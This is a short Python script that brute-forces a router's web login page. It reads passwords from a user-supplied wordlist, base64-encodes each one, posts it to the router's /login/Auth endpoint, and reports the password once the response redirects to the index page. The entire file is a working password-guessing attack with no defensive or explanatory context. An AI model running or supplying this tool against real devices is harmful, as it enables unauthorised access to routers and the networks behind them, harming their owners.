import base64
import requests
ip = input("Input IP Router : ")
passwd = input("Input Wordlist : ")
print("========= Scanning ==========")
with open(passwd, 'r') as katasandi:
    for baris in katasandi:
        kata = baris.replace('\n', '')
        encode = base64.b64encode(bytes(kata, 'utf-8')).decode('ascii')
        payload = {
            'password': encode
        }
        login = requests.post('http://'+ip+'/login/Auth', data=payload, allow_redirects=True)
        if 'http://'+ip+'/index.html' == login.url:
            print("="*30)
            print("\033[32mPassword Found\033[39m : " + kata)
            break
        else:
            print("Trying "+kata)
